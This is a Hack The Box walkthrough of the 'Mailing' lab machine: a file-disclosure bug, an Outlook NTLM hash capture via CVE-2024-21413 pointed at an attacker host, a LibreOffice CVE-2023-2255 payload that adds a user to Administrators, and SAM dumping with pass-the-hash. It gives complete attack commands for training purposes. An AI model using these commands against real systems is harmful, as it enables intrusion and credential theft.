📬 Hack The Box: Mailing – Walkthrough

Difficulty: Medium
Category: Windows / Web / Privilege Escalation

🧠 Summary

To fully compromise the "Mailing" HTB machine, I followed this attack path:

    Information Disclosure: Leaked hMailServer.ini to extract a password hash

    NTLM Relay Attack: Leveraged CVE-2024-21413 to capture a NetNTLMv2 hash from user maya

    Privilege Escalation: Abused CVE-2023-2255 (LibreOffice) to escalate to localadmin

🔍 Recon

Initial Nmap scan revealed several open ports, including:

    Port 80 - HTTP Web Server

    Port 587 - SMTP (Used by hMailServer)

    Port 5985 - WinRM (Useful later for access)

Visiting the website hosted on port 80 revealed nothing of use, so I ran dirsearch to hunt for hidden directories.
📁 Vulnerability Discovery: File Disclosure

/download.php returned No file specified for download — suggesting a file may be passed via a GET parameter.

I tested:

/download.php?file=config.txt

After testing a few paths, I confirmed a Local File Inclusion (LFI) that allowed access to:

C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini

Inside, I found a hashed password for the admin user. I submitted it to hashes.com and successfully cracked it.
💥 Exploitation: CVE-2024-21413 (Outlook RCE via NTLM)

After some research, I leveraged CVE-2024-21413 to perform an Outlook NTLM Relay using this public script:

    GitHub - xaitax/CVE-2024-21413

I ran the exploit while listening with responder, targeting maya@mailing.htb:

python3 CVE-2024-21413.py \
  --server mailing.htb \
  --port 587 \
  --username administrator@mailing.htb \
  --password <plaintext_password> \
  --sender administrator@mailing.htb \
  --recipient maya@mailing.htb \
  --url "\\<attacker_ip>\test\meeting" \
  --subject "Test"

After a few attempts, responder caught the NetNTLMv2 hash for maya. I cracked it using hashcat.
🧑‍💻 Initial Foothold

With maya's credentials and port 5985 open, I used evil-winrm to log in:

evil-winrm -i mailing.htb -u maya -p <plaintext_password>

I now had user-level access.
🔓 Privilege Escalation: LibreOffice Exploit (CVE-2023-2255)

In C:\Program Files\, I found LibreOffice v7.4. I verified that it was vulnerable to CVE-2023-2255, which allows execution of arbitrary commands via malicious .odt files.

    GitHub - elweth-sec/CVE-2023-2255

I generated an .odt payload that added maya to the Administrators group:

net localgroup administrators maya /add

Once executed successfully, I confirmed elevated privileges.
🛠️ Post-Exploitation: Hash Dump & Admin Access

Using crackmapexec:

crackmapexec smb mailing.htb -u maya -p <password> --sam

I dumped local password hashes, including one for localadmin. Instead of cracking it, I used the hash directly via wmiexec.py from Impacket:

wmiexec.py -hashes :<NTLM> localadmin@mailing.htb

And... rooted 🎉
🧾 Flags

    ✅ user.txt – Obtained via evil-winrm as maya

    ✅ root.txt – Obtained via wmiexec as localadmin

⚔️ Conclusion

Mailing was an elegant machine that combined:

    LFI → Config Leak

    NTLM Relay via Outlook → User Access

    LibreOffice LPE → Full Admin Access

It highlights the importance of patching exposed services and validating user input on web apps.
